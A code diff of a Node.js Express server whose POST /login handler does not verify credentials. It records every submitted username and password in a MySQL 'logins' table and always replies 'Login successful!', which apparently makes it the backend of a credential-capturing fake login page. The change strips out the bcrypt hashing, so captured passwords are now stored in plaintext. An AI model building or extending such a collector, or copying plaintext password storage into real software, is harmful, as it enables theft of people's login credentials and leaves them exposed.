@@ -2,7 +2,7 @@ const express = require("express");
 const mysql = require("mysql2");
 const path = require("path");
 const bodyParser = require("body-parser");
-const bcrypt = require("bcryptjs"); // ✅ Import bcrypt for password hashing
+const bcrypt = require("bcryptjs");
 
 const app = express();
 const PORT = 80;
@@ -11,7 +11,7 @@ const PORT = 80;
 app.use(bodyParser.json());
 
 // ✅ Serve static files from /var/www/html
-app.use(express.static("/home/ubuntu/UC2"));
+app.use(express.static("/home/ubuntu/UC1"));
 
 // Database configuration
 const dbConfig = {
@@ -64,41 +64,32 @@ connection.connect((err) => {
 
 // ✅ Serve login page for GET /
 app.get("/", (req, res) => {
-    res.sendFile(path.join("/home/Ubuntu/UC2", "index.html"));
+    res.sendFile(path.join("/home/Ubuntu/UC1", "index.html"));
 });
 
 // ✅ Serve login page for GET /login
 app.get("/login", (req, res) => {
-    res.sendFile(path.join("/home/ubuntu/UC2", "index.html"));
+    res.sendFile(path.join("/home/ubuntu/UC1", "index.html"));
 });
 
 // ✅ Handle login data submission (POST request)
-app.post("/login", async (req, res) => {
+app.post("/login", (req, res) => {
     const { username, password } = req.body;
 
     if (!username || !password) {
         return res.status(400).json({ error: "Username and password required!" });
     }
 
-    try {
-        // ✅ Hash password using bcrypt before saving
-        const saltRounds = 10; // Higher is more secure but slower
-        const hashedPassword = await bcrypt.hash(password, saltRounds);
-
-        // ✅ Insert user login data into MySQL database
-        const insertQuery = "INSERT INTO logins (username, password) VALUES (?, ?)";
-        connection.query(insertQuery, [username, hashedPassword], (err) => {
-            if (err) {
-                console.error("❌ Error saving login data:", err);
-                return res.status(500).json({ error: "Failed to save login data!" });
-            }
-            console.log("✅ Login saved successfully!");
-            res.status(200).json({ message: "Login successful!" });
-        });
-    } catch (error) {
-        console.error("❌ Error hashing password:", error);
-        res.status(500).json({ error: "Server error!" });
-    }
+    // Insert user login data into MySQL database
+    const insertQuery = "INSERT INTO logins (username, password) VALUES (?, ?)";
+    connection.query(insertQuery, [username, password], (err) => {
+        if (err) {
+            console.error("❌ Error saving login data:", err);
+            return res.status(500).json({ error: "Failed to save login data!" });
+        }
+        console.log("✅ Login saved successfully!");
+        res.status(200).json({ message: "Login successful!" });
+    });
 });
 
 // Start server
